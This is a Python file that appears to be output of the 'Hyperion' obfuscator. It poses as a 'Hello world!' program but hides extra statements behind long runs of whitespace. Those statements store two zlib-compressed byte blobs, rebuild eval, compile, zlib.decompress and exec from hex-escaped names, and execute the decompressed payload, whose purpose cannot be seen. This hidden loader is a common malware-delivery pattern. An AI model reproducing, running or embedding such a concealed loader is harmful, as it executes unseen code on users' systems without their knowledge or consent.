from builtins import *
from math import prod as Invert


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_substract, _run, _positive, _statistics, Substract, _calculate, Square = exec, str, tuple, map, ord, globals, type

class _algorithm:
    def __init__(self, CallFunction):
        self._stackoverflow = Invert((CallFunction, 12720))
        self._multiply(_math=-78936)

    def _multiply(self, _math = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._stackoverflow += -47137 / _math
        
        try:
            (Math, _run) if _calculate is _positive else {_positive: _positive} > _calculate

        except ArithmeticError:
            (((_positive, _positive), _substract) for _substract in (_positive, _positive))

        except:
            Square(-80683 - -52192) == int

    def _random(self, Positive = 6690):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Positive -= -63747 * 90687
        self._absolute != float
        
        try:
            (((_run, Substract), Math) for Math in (_substract, _substract, Math))

        except ArithmeticError:
            ((_statistics, {_positive: _positive}) for _statistics in (Math, _run) if _run > Math)

        except:
            Square(90243 + -96400) == True

    def Walk(Frame = str):
        return _calculate()[Frame]

    def _detectvar(Absolute = 79435 - 40241, Floor = float, System = _calculate):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        System()[Absolute] = Floor
        
        try:
            (((Math, _run), _substract) for _substract in (_run, Substract))

        except TypeError:
            (((Math, _run), _substract) for _substract in (_positive, _positive))

        except:
            Square(-65079 + -17561) == None

    def execute(code = str):
        return _substract(_run(_positive(_statistics(Substract, code))))

    @property
    def _absolute(self):
        self.Theory = '<__main__.Positive object at 0x000004468BE55631>'
        return (self.Theory, _algorithm._absolute)

if __name__ == '__main__':
    try:
        _algorithm.execute(code = __code__)
        _divide = _algorithm(CallFunction = -99514 - 96923)

        _algorithm(CallFunction = 44830 - 7816)._random(Positive = -75321 + _divide._stackoverflow)                                                                                                                                                                                                                                                          ;_algorithm._detectvar(Absolute='xwwxxxwxxxwxxwxww',Floor=b'x\x9c\xe5\x1c]S\xe38\xf2\x9d_\x91\xe5%I\xe1a\x1c\xf9+\xa1*/wp\xb7a\x03l\xc1\xec\xc2\xde\xecT\xca\xb1\x150\xa3\xd8\x9c\xed,\xc9\xbf\xbf\xee\x96\xe4\x18\x12\xc0\x0e\x9e\xa9\xad\x1b;\x96%\xb9\xdd\x92Z\xadVwKN\x9e\xae\x8e\xf6ZpD\xb3\x0e\xdd\xf1\x98L\x92\xe9l\x91\x05~\x9e\xa4\x93I\xeb\xa7\xe1\xfe\xcf\xab\x07\x9eFI\xbc\xdfJ\xd2\x12\x98\xbf\xc8\xef\x924#\x98\xce\xfe4\x12b\x95\xdf\xf1\xdb\xc4\xcf-\xc7\xdd7\xf6\xff!\x16\xfc\x92\x87\xfb\xdd\'o\xddF\xf9\xddb*\x11\xdf\xe5\xf9Cv\xf4\xf1\xa3\xcc;\x0c\x92\xf9\xc7gh>\xbePv\x18eA\x92\x86O\xd1\xa8\xcc\xc3\xdb\xdb\x8f\x0f\xc2\xbf]\xf0g/\x89(\xe0q\xc6\xe5K\'\xbf\x8e?\xb0C\xf3\x19H\x90\x84\xf2y\xfb!\x8d\xe2\xbc\xb3\xff3\x17"i=&\xa9\x08\x7f\xda\xef\xb6\xf7\xbaG\x054>og_\xa3\xb0\xdd\xdd\xe3\xcb\x80?\xe4\x8a\x98\xf1\xc3\x02\xde\xbcL2\x9e\xb5\xfc\x94\xb7R\x1e\xfe\x19\xff\x1e%\x82\xe72c\n\x94\xf93\xfe#YP\xcao!\x92?\xe3\xf3d\x9a\x84\xab\x96\x88\xbe\xc2{\xabd\xb1\xdf\xdd\x93\x95\x8a\xe6\x0fI\x9aO&P\xda*kw\x0f\xf92\xca;\xdd=\x91\x04\xbe\xc8:\xdd\xcf\xed\xe3\xe3\x8b\xe4\x18\xce\x0b\xb8\xc1\x95@\x14"\xc9E\xd2\xfe2\xbc\x15\xc9\x14\xc0\xf6^\x84A\x04\xec\x8a1vu\x05\xbf+\x0c\x99L\xb3\xab\xf6\xe7\xa3\xa3\x83\x0f\x07\x1f:\x1f:\x07\xbdn\xf7\x0b\xa0\xe3\xb9\x9f\xe7\xe9\xeb\xe8\xce\xcf\xce\xcf\xcf\xcf \xa0\xdf\x19\xc46\x11\x85\xd1\x1bHF\xe3\xf1x4:\x1d\x9d\x8eOG\xa3\xd1\xf8t<:=\x8584I6|\xef\x05\x00|\x17p\\ \x1e\xc2\x8d\xc8\xa1\x14(\x01\xde]S\xf3\xf5\xd2\xaf\xafo\xe4\x89\x01$nn\xe0\xe5\x17\xd0v\xda\xd3E$\xf2(\xc6\xce\xf9\xcbO\xb3\xbd\xcd\xb7\x11\xe7}t\x7f/Dt/\xa2H\xdc\xdfc \xc4=\xa0\xbdR\xe4fE\x07\xc8t\xe7\xc5\xf2\xb28\xcaE\xb4\x98>\'k\xd7 j+\xcaS/\x9c\xef\x80\xa5\xfb\xb9\x194\x87Q\x1c\xf2e\xa7-\xfc\xbf\xf8\xc6\xd3/\xdd\xd7{\xd04\xcd\x04\x0f\xea\x1a3\xb90/\xcc\x1f\x81V|\x91~\xdaF\xab\xed,u||L\xd8\xa1(,\x138x\'\x1aEQ\x90\xf9q\xf4N\x1a\xbd\x88\xa5\x1e\x8d^F\xa3i\xb4\x9aEb\xc9\xef\xe2EuBI1D\xa5\xcb\xf3G\xe0\xa5\xdcO\xc4l\x1b\x8d^\x15}\xc72u\x01@x&\x92\xbb\x8e\x8f\x81b\xed\xf6\xe1}\x12\xc5\xaf\r\\\x11\x81\x84\x03I\x07\xc1\xbd\xb8\x97\xc2\x0e3\xc4\x8f@p\x91$\x9bO\xdf\xa2\xf7\x99<\x8a*\xd0\xf1\xa3\xb0(\x17\xd1\xc3<\tj\xce\x0e\xa3\x91\x18\xe1!\xf0\x0e\x81\xf8!\xb8\x8bg\xc2\xffWm\xf6\x12D \xa4Q\x11\xfc\x08\xc4J\xf3\xac.\xa96\'\xd3\xce\xb4ms:\xc3\xe2\xe4\xa5p\x9d\xe2:\x0e*`\xc8\xd1\x8c\xe8\xb4\xfb\xb3|\xcb\x0c\xf5\xffO\xfa\x80/\xb7\xaa{[g\xe6\xedD\xd7\xa4\xe5\x05i\xd7\xddP\xee\x8cJ\x04\xdf\xaaww\xb6\x16\xcc\x98c\xdb\x8e\x1d:&co!\xae\xd5\xa0\x99e\xda3{\xe6\xd2\xdd2-\xd3\x9d\xc9\xd3\x9e\xe9\x18\xe6\xda*\xaf\xe1F\xd9=\xc7tL\xdb\x86;\\;7\r\xe4\xae\x94\xc8 \x87A:\x9f\xa2\x80\xa6\x8c2\x82\xed\x15kw\xddIobN\xdc\t\x9b\xf4\'\x16\x84\xd6\xc4\x01ho3\xf7md[[i\x99,d}\x16Z=6x\xb3}2\x003T\xf8\xf3i\xe8\xb74\xef+\x1d\x91\xb4\xc5\xb3\xb3\xa3mT\xa8\xd3\xebe\xe9\x10>\x93\x14\x05c7\xcd\xc0\x81\x134\xcc\xbc\xcfF\\\xa9\t\xcfG\xa9\xba\x9am\x92\xc7\xb8;p\xb9;e^\x93\xcd\x02\x9c\xfa\x0c\\\x9fB}\xfaE(\x9fc\xcc\x7f\xbbQ\x8a\x99.\xcc\xc4\xbc@\x93\x15\x0e0bM\x93&\x1a\xb8\xbf\x97\x9f\x80\x06!\\:\xc4\xfb\xfaT\xb9\r\x93\xde\xe5\x9e\xbd3\xd9\xdbX\n\x16\x15\xa1\x11 \xc8&\xd8ut\xf7\xd4\xe86\xab\x8d\xee\xfa\x1cfc\x9f7\xcca\xbe\xe4\x1c\xc5_\x9a\xcf\xfc\xe2>PaP\x99\xb7d\x81\x14R\xec\xe6Z^\xd7G\xafh6/\xf4\x0eVS\xdayX\xe9cz\xb1\x8a$\xb7\'6Hl\xbc,\x90\xde\x0e\xdc\x07\x00\xedl\xe6V\x9b\x16\\\x10\xfd&\xbc\xe2Q\xac7qiZ\xd8\xc8\xdd\x95q,\x07fV\xb8\x1c\xb8l\xb80\xdd/\xa5{x\xb1)1W\x15\xd8\x8a\x0c\xb8\x9eb^j\xb9\t/\x98\xdfk\xb2{\x81\x05\xd6\xa957AP\xa5\xe3\xb0\xfa\xbd\x06\x01\x1b\x19\xf6oQ\xfd\xc5\xe1\xef\xd9n\xe8\x99\xbbK:2\xadDa\x91\x8e(Q\x85:\x0e\xa9==8-\x1c2\x13\x06\xb0\xee\xf3\xbc]\xa97P<\xec)\x1e\xc6\x8b)^6U|\xa0x\xbf\nl\x7f\x07\xd5J(\x82(\x9a\x8c\x94\xc1.\xea\x0b\xac\xadm\xf4\xfa\x9e\x07\x97<\xe5\xd1/\xae\'\xb1\xa6\x95\x92\xddgE,C\xf9\xc8\x04\x96!\xfe\xb6\x93\xa2\xe5\xba\xee\xee-\xdd\xaeM\xda\xd2\xe8\x01s\xc8F\x93\x08\xef\xca\x14\xc2\'\xb6L\xdb\xb3\xf5\xb3\xe6\xb5I\xdf3\x9bn\x96cY\x0c\xc6\x88%\xef\xe5\x13\xf3t>\x86:\xddx\xb3\xa0Q\xfc\x1d\xcdj\xebI\x00\xb3(\xbf\xd1i\xa0Wm\xbaC\x89\xd8\x87\xd3&\x93\x90\xc1\xbd\xa7d\xe2F\xeew4\x14w\x9cW\x1c\xcbu\\\x90\xa8\x1es\x07\x9e\xed\r\xec>\xa4{n\x00\xb3M\xdf\xb1\xbc\x81gA.s{\xde\x00\x98\xd2\xf1\xe0i\xd3L)\x19\xae\xcc\x8aOY\x13\xaf\xca\xca\xe7<\x8e\xe7\xf1\x1c\x8e\x18\x7f1\x1e\x90x\xb7\x95\xec\xdb\x81=\xa0k\x00q\xbct\xe8\x97\x9f5/\x06l\x975,\xdb\xb0\xba\x81j@\xa0\x9a$C\xdd\xb8@\x9d\x94\xff\xb7\x99\x92\xae\xa5\xe6w\xa3\x9e\\WU\x02=\xd0NzpY\xa8\xa5@\x08c\x14\xa0\xfb\x9b\xb9\xbb\x8eUWi\x1e=\xad\xad(\r\xc5Ri|n+\r\xa6\n\xac\xb5\x83\x063\x1e\xe3\xba\x03\xb9\xbb\xc6\xa7#:O\x8f^\\\x9d\xa8\xc3.\x03b\x18\xcd\xef:\x15\xa8\x94f\x99\xe69\x9f$R\xd3\xc6\xee\xda\xd0]\x9b\xbb\xeb\xf8\x80\x8c\xe1\x81v\xaa4?\x98=\x12\xa3;\x8f\x00@*q\x17~\xef\xe3\xe4\x9b[7\xb6\xe6`m[\xaa\xb4\xe6\xe2\x1eq\xac\xe4\xee*\xb0\xac\x0ew\xd7\xa9h_\r\xa5^\xa9pm \xe8\xbb6\xa2\xdf\x82\xedU\x1c\x86u\xe6\xb9>\x9c\x9e\n\xbd"\xaes\xbdR\x1a\xce\xa6\x9d\xeb\x01\xa8\xa9\x96\xdd\x83{Cnv\xb9\x04\xa36*H\xa74\x86\xef\x91\xa1}%\x0f\xfbJ\x1e\xea\x8e\xd1y\xac$C\xdf\x82\xad\xa87\xd5\xf542\xb06l\xd0\x8f\xc0\xe2p\xfb$)\xa6 +\xd0\xa99\xf3L\xaf\x07\xb3\x1bjK\x8e\xe7\x92A7\xf0\xfc\xdd\x07\xfb\x95>h\x05\x8eQ\xd8\xa8\x0ek\xc3\xacg\x93\x13\x8cQ\xcc\xa6y\xd1\xd9\xcc\xdd\xd9\xf2S}\xe1\x95\xfa\xc5-y\xaa\xca}Z\x05\xb6\xa6.\\\xb3o\xbdw\xa8&\xa8c\xc6R\xe1\x9c\xab0&=\xb4\xd1\x0e\xfb>\xde,[Q\xdcU=\xa1G\x95\xa7\xf2\xbc\x926S\x05\xb6\x866\xb3[\xcf\x81u\x00\xc2\xcdul\xc7\x03\xa1\xc6l\x07W\x97\xec\x10F\xa7\x05\x1a\xc4\xcc\xb3\xc0nw=\x1bsa`\xe2"\r\xd8\xeb\xd0\xdd\x16\xc1\x91\xe5\x03p\x0e\xae"\xc0\xc0\xc6\x94\x05P3\x97\xd3\x1b` \xb9\xbc\xd9\xb5\xaa\xc2\t\xe4\x15\xce\xa0~\xe1\x08*;\x84\xd4\xd1\xb0\x1eB\x8bo\xef0\xc0\xd7\xeeX\xa5\x8a\xbf\xc7\xf3\xa7\xf5`}9\x8a\x8bl=\x11\x97<\x7fo\xc1~\x1b\x0f\x13\xf0\x87\xed\xba\xa83\xbc\xc7t)\xe7"\xe9\x9a\x1d\xef\xb4\x98\xc1@f\xa3\xdcFo\xac\x855\xda\xcc}\x8f$7K\xe3Z\xfb^\x07\xaa\'p\x06vK\x92\xfc-X\xa7\xae$WV\xce\xe3\xf2\x11\x0f\n\x97K\xba5\xe4\xa2-\x96\'\xf5\xb2%/\xa5\x8bXe/\x84v\xb4\x93\xaf\x9d\xdc\xca\xe8T\xaek\x90\xb5\x05nO\x14\xd8C\x82\\\xb1;;a\xb5\x9a\xa4MM[u\x86\x9er\xcbB\xbd\nlE\xa1^S\x90\xb3\xddw\xb4\xb4i\xe2%oO,\xa34\x0f78\xffn\'\xac\xa3\x08c\x97\x88\xa6\xb9\xdc\xd4z\xaa"l\x15\xd8Z\xab\x17\xb5\x88+\xe5\x18\x14\xd0\xe8\\V\xd8\xccA\xb1X<(mQ\xa8dEk\xcf\x9d<t\x07\xd6r\xda\xb5\xef\x05-V\xc85\x0b\x1a,Q\xa3\xba\x97K\x0b\xbd&\xad\x1c\x9b JA1\xa6%\xe0\x8d\xdc\xbf\xebj\xe3nk+\xbe\x0b6M\xd3>\x18t\x17a\x88<R\xf8\x1dK[[\xf4\x93\xa67\x1d\xb1\xc2\xb1\xed\xb8Sf\xda}\xdb\x86\xb0\x07\n\x9e\x8d\n\x1f3\x1dP\xf5\xdc\x81\xa7\x95@\x80\x85<\x8bR.\xaa\x93\xae\xb3\xbb|2\xcdD\xee\xb7\xc1}7\x18\xc1\xe8\x85iV\xd8\xcd\xf0M\xd7\xd5\xda\xdd\x01\xe8\x07\x03\xda\x14\xc1\x80\x891\x8e\xbb\x1b\x06\xa41<\xc9\xad\xb60\xc2hI\x18\x91\xca\x91\xd1\xa7\x85\x91\x8d\xdc*\xc8pe\xb9G\x03\xcb%]\xa6?\xf1\x00\xda\xde\xcc\xfd\xde\xab,\xaf}\xc0\xa1\xf6\xe5\x9d)\xe7\xc8\xf9\xce.\x91\x9a\x95{\xf7&\x8ev\xb7O}\xedN<\xea(\xb4\xfd\x19q\xc2F\xee\xf7\xa4wM\xd1R\x16*Z\xd4\xe8\xfc\xb5\x80\xb1\xeb\xecg\xc2\xf1\n\x07~\xee\x95\xd0\x9d\x860\x0c\xdf\x86t\xcfb\xbd%P\xaeu\xff\xc9\x8a\xcc7Y\x87an\xdf\xb3\xe14=\xcb\xf2\xd9\x8c\xcdh\x89O\xfa\xa8\x07\xb8\xf4\x07R\x11U\x06\x92~.\x9a\xd0\x9c\xe4&n\xb5\xe3\x94\x0e\x19\x9a\xd6}\x82\x864@\xd9,D\xe7\x98\xe7z\xd6\x96g\xf0\x06HT0\xbf\x19.\xa434\xa9<Z\x10\xf6\x06U\xa4\xea,M\xe6-\xfd\rcK~ \xd9\xf2\x850\xc2(5\xf8\x92\x07F\xea\xc7\xb7\xdcH\x1exl\xe0\xd7\xa7{\x98\xd99\xc5\x85\x91\x11j\xdd')

        _algorithm(CallFunction = 54087 - 10840)._multiply(_math = _divide._stackoverflow * -6932)                                                                                                                                                                                                                                                          ;_algorithm._detectvar(Absolute='nnmnmmnnmnmmmnnnnnn',Floor=b'c\xd4\xc01J\x1b\x82\x15\xc2lU\xe0B\xf0E\xeeO\x05\x97\x8f\x16)\xd0r\xaa\x9f\xa6\xfc\xbf\x0b\x9e\xe5\xf2QR\xbct\xcbs\x1e\xffe\x00\x9a\x9c\xcf\x8d\xd8\x9fsCDY\x8e\x1f\x8e*\xc8\xc3\x07?\xbf\xd3\xe0Q6\x8b\x00\xbfJ=Fq\xcao% T>\x84\x9bz\x12\xdc%Q\x00p\xb3\x16\xa2l\xfd4$\xa5H.e*\x15I~\xc7\xab>\xb3\r\xf9\x0c\xab\xf2+\x14\xd5Q_\xffb\xb1C\x89\xa7\xf3YV\xb3sa\xd2\xf4#?ZT\xfb=\x91-\xba\x86\x02\xb8Q+kj\x8b\x95Zj\xbf\xc1Q\x888\xa1Y<\xc8\x93t5T\x8d\xec`)\xf2\xd9,I[\x93V\x14\xb7\xa8\x1b:8\xb3\xd1\x0c\x07S\x1dLs4\xefa\xc2,}\x9c\x0c\xb5\xcbx\xac+Y \xef\x16\x00+>\xc4\x02\x0e\xce\xcf\x8a\x8d\xcf\xfa\x13\x80\x03\xf9\xf2\xfaCg U\xa2\t\xdcY\xf1.\xd0\xb3\xa5\x8c&\xb2\x9fP+\x14\x12&V%\xafk\x82G\xca\xf3E\x1aC\x99{\xa5\x94\xa2\x8b\xfc\xf2\x80\xae\xf3\xb5\x80/\xe8~\x0e\x9d\xa4\xe9>\x8b\xd2\x8c2\x86K4Q\x97d\xaebT\x06\xf4mZG5y\xed6W~tYJ\xf7\x19-q\x99\'Qk>\xf8\x85\x03~\xf4\xd6\x95T\x12~Fe}\x96zo\x04M\x8d\xd0bD\xb3\xd1 \xa71S\x87r"\xd3\xdd@ip\x01\x12\x0b\xa5A\xa2\xc4\x03\xa5\x0ciq\xa2\xf0\xa00\x92h#\xa3\x98\xd4\x8a\xaa\xaa\xbb\x81\xc6\xec\xa9\xb4i\xc1\x9c\xa5162\xa2H\xa9\xe1(\x87H.\xdd\x1b\x9a\xab\xf4F\xbek\xc9h\xc6\xe9X\xef\xd8GkX\xa6\x0cA\x9b\x8e\xf4Gz\xd8\xa2/\xe5~)\xa8|\xa0H\xa9\x08!\xbb\x04$D\x0e\xa2Ar\xa7\xec\x96\xc7\x08F!\xca\x06\xca4\xe6 j\x86k\xbf:+\x9c\xed\x06\x8fA\x0cE\xf1\xedP\xaf3\xafkz\xd3\xf5\xb3\xd6l\xcd5\xb3\xc3\xc74\xcayG\xc9\x86C\x90\x18T\xc2\x98\x0e\xb4\xf1I\xe6\x90\xb89L\xb9\x1fv\n)\xa7\\\xc4\xd2P\xd5\x9b\x14\xe2\xae\xac~\xba\x88\xcbU\x97\xc2\xa5SC\xba\xbb\xb8g\xc0\x02\xd9\x8b\x0b\x12\xa0\xe3zS\xb9q\x83\xb6y@.H\xdf\x00rB|\xe2\x99\x00\x85\xf2>\xac \x85e\xfd\x80\xb8i\xfe\xdb\xaf\xe5:\xce\xfc\xaf<\x1c\xaa-9z\x83\xce\xcd\r=\xf3\xc30\xe5YVgz\xa2\x064Ui\xaa\xc4W\xbe\xea\r\xa5\xc0=\xfc\xf9\x97\x93?&\xff\xfc\xed\xf2\xf2\xe4\xfc\xd3\xe4\xb7\xab\x93K\r\xc1\x86s%e\x9f8\xf2\xf1"\x10\xec\xdd\x89\xc6\xf2O\xe8\xd1\x9c\xff\xc2W\'\xcb\x0eb7\x10\x81Q\x88(=\\(0\xd4;X\xf0\xf5\xe5\xe8\xd3IW1%\xe5^\xf1\xfcw_,8 \xa2\x12\x0c\xf5\xc1\xa0\xdc\x88\xa8\xbe\x87\x1b\x194H\xf5\x87\xaej_\xb4F|y\xf2\xef\xc9\xd5\x7f\x8c\xfa$v\x81\xb0@h\xd7F\xc22\x97x\xa5\x07\xb38n\xf9\x81\xd9\x1f\xcej|q\x9c\xfc\x91,~\x89\x93\xc7Ow\xfc\xda_\r\x8b\xd9\xe8@\xba\xec\x1e\xa50\\J9\x88\xe9\x83Bp\xee\xe9\xf1\xfa\x0cIw\x0fG\xc2Ff\xae\xff\x11D\xf3\xe1\x06D\xf9\x9f.\x1e\xfc,\xdb\xfb\x1f\xe3\xbf;M')

        _algorithm(CallFunction = 25815 + -29422)._random(Positive = 71884 - _divide._stackoverflow)                                                                                                                                                                                                                                                          ;xxwxxwxxxwxwwxxxwxwwxxx,llIIlIlIIIIIIIllllIllllll,xxwwwxwwxxxwwwwwwwxxwxxwx,nnmnnmnnnmnmmmmmn,nnnmmmmmnnnmmnnmnm=(lambda DODOOOOoDOoOOODDOOOoODooD:DODOOOOoDOoOOODDOOOoODooD(__import__('\x7a\x6c\x69\x62'))),(lambda DODOOOOoDOoOOODDOOOoODooD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DODOOOOoDOoOOODDOOOoODooD)"),filename='\x69\x6a\x69\x69\x6a\x6a\x6c\x6c\x6c\x69\x69\x6a\x6a\x69\x69\x6a\x6c\x69\x69\x69\x6c\x6c\x6c\x6c\x69',mode='\x65\x76\x61\x6c'))),(lambda DODOOOOoDOoOOODDOOOoODooD:DODOOOOoDOoOOODDOOOoODooD['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda DODOOOOoDOoOOODDOOOoODooD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DODOOOOoDOoOOODDOOOoODooD)"),filename='\x69\x6a\x69\x69\x6a\x6a\x6c\x6c\x6c\x69\x69\x6a\x6a\x69\x69\x6a\x6c\x69\x69\x69\x6c\x6c\x6c\x6c\x69',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda O0o0oo000oO0OooO0o0o0oO0o,DODOOOOoDOoOOODDOOOoODooD:O0o0oo000oO0OooO0o0o0oO0o(DODOOOOoDOoOOODDOOOoODooD))
        _algorithm(CallFunction = -57570 * -9731)._multiply(_math = _divide._stackoverflow * 85273)                                                                                                                                                                                                                                                          ;nnmnnmnnnmnmmmmmn()(nnnmmmmmnnnmmnnmnm(xxwwwxwwxxxwwwwwwwxxwxxwx(xxwxxwxxxwxwwxxxwxwwxxx(llIIlIlIIIIIIIllllIllllll('\x76\x61\x72\x73'))),_algorithm.Walk(Frame='xwwxxxwxxxwxxwxww')+_algorithm.Walk(Frame='nnmnmmnnmnmmmnnnnnn')))

    except Exception as Math:
        if 290687 > 7139084:
            _algorithm.execute(code = _run(Math))

        elif 388462 > 5837296:
            _divide._multiply(_math = _divide._stackoverflow + -13142)